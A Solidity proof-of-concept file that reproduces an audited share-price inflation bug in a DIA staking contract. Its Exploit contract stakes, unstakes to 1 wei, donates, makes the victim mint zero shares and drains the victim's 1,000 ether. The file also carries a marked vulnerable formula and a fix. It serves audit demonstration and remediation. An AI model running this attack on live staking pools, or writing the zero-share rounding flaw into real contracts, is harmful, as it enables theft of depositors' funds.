// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  DIA DIAExternalStaking — permissionless donation inflates the share price
    (MixBytes, Lumina Staking, 2025-06, Critical 2).
    SYNTHETIC, cheatcode-free. The share formula and addRewardToPool are verbatim.

    Attacker stakes 1 ether in an empty pool, unstakes all but 1 wei, then
    donates the victim's 1,000 ether. The victim's stake mints
    amount * 1 / (amount + 1) = 0 shares. The attacker withdraws the pool.
    unstakingDuration is 0, so request and unstake fit in one block. */

contract StakeToken {
    string public constant name = "WDIA";
    string public constant symbol = "WDIA";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract DIAExternalStaking {
    struct ExternalStakingStore {
        address beneficiary;
        address principalPayoutWallet;
        uint256 principal;
        uint256 poolShares;
        uint64 unstakingRequestTime;
    }

    uint256 public constant minimumStake = 1 ether;
    StakeToken public STAKING_TOKEN;
    uint256 public unstakingDuration;
    uint256 public stakingLimit;
    uint256 public totalPoolSize;
    uint256 public totalShareAmount;
    uint256 public stakingIndex;
    mapping(uint256 => ExternalStakingStore) public stakingStores;

    constructor(StakeToken token_, uint256 limit_) {
        STAKING_TOKEN = token_;
        stakingLimit = limit_;
    }

    function _stake(address beneficiary, uint256 amount, address staker) internal returns (uint256) {
        if (amount < minimumStake) revert("min");
        STAKING_TOKEN.transferFrom(staker, address(this), amount);
        uint256 poolSharesGiven = 0;
        if (totalShareAmount == 0) {
            poolSharesGiven = amount;
        } else {
            // @> VULN: poolSharesGiven = (amount * totalShareAmount) / totalPoolSize rounds to 0
            poolSharesGiven = (amount * totalShareAmount) / totalPoolSize;
        }
        totalPoolSize += amount;
        totalShareAmount += poolSharesGiven;
        stakingIndex++;
        ExternalStakingStore storage store = stakingStores[stakingIndex];
        store.beneficiary = beneficiary;
        store.principalPayoutWallet = staker;
        store.principal = amount;
        store.poolShares = poolSharesGiven;
        return stakingIndex;
    }

    function stake(uint256 amount) external virtual returns (uint256) {
        return _stake(msg.sender, amount, msg.sender);
    }

    function addRewardToPool(uint256 amount) public {
        STAKING_TOKEN.transferFrom(msg.sender, address(this), amount);
        totalPoolSize += amount;
    }

    function requestUnstake(uint256 index) external {
        stakingStores[index].unstakingRequestTime = uint64(block.timestamp);
    }

    function unstake(uint256 index, uint256 amount) external {
        ExternalStakingStore storage currentStore = stakingStores[index];
        require(currentStore.unstakingRequestTime != 0, "no request");
        require(currentStore.unstakingRequestTime + unstakingDuration <= block.timestamp, "wait");
        uint256 currentAmountOfPool = (currentStore.poolShares * totalPoolSize) / totalShareAmount;
        require(amount <= currentAmountOfPool, "too much");
        uint256 poolSharesUnstakeAmount = (currentStore.poolShares * amount) / currentAmountOfPool;
        uint256 principalUnstakeAmount = (currentStore.principal * amount) / currentAmountOfPool;
        uint256 rewardUnstakeAmount = amount - principalUnstakeAmount;
        currentStore.principal -= principalUnstakeAmount;
        currentStore.poolShares -= poolSharesUnstakeAmount;
        currentStore.unstakingRequestTime = 0;
        totalPoolSize -= amount;
        totalShareAmount -= poolSharesUnstakeAmount;
        STAKING_TOKEN.transfer(currentStore.principalPayoutWallet, principalUnstakeAmount + rewardUnstakeAmount);
    }

    function sharesOf(uint256 index) external view returns (uint256) {
        return stakingStores[index].poolShares;
    }
}

contract DIAExternalStakingFixed is DIAExternalStaking {
    constructor(StakeToken token_, uint256 limit_) DIAExternalStaking(token_, limit_) {}

    function stake(uint256 amount) external override returns (uint256 index) {
        index = _stake(msg.sender, amount, msg.sender);
        require(stakingStores[index].poolShares > 0, "zero shares");
    }
}

contract Victim {
    function deposit(StakeToken token, DIAExternalStaking staking, uint256 amount) external {
        token.approve(address(staking), amount);
        staking.stake(amount);
    }
}

contract Exploit {
    uint256 public constant MIN = 1 ether;
    uint256 public constant DONATION = 1_000 ether;

    StakeToken public token; // nonce 1
    DIAExternalStaking public staking; // nonce 2
    Victim public victim; // nonce 3

    uint256 public attackerIndex;
    uint256 public victimIndex;
    uint256 public victimShares;
    uint256 public stolen;

    constructor() {
        token = new StakeToken();
        staking = new DIAExternalStaking(token, 1_000_000 ether);
        victim = new Victim();
        token.mint(address(this), MIN + DONATION);
        token.mint(address(victim), DONATION);
    }

    function run() external {
        uint256 start = token.balanceOf(address(this));
        token.approve(address(staking), type(uint256).max);
        attackerIndex = staking.stake(MIN);
        staking.requestUnstake(attackerIndex);
        staking.unstake(attackerIndex, MIN - 1);
        staking.addRewardToPool(DONATION);
        victim.deposit(token, staking, DONATION);
        victimIndex = staking.stakingIndex();
        victimShares = staking.sharesOf(victimIndex);
        uint256 pool = staking.totalPoolSize();
        staking.requestUnstake(attackerIndex);
        staking.unstake(attackerIndex, pool);
        stolen = token.balanceOf(address(this)) - start;
        require(staking.totalShareAmount() == 0 || victimShares == 0, "victim shares");
        require(victimShares == 0, "victim minted 0");
        require(stolen == DONATION, "stole 1000");
        require(token.balanceOf(address(victim)) == 0, "victim emptied");
    }
}
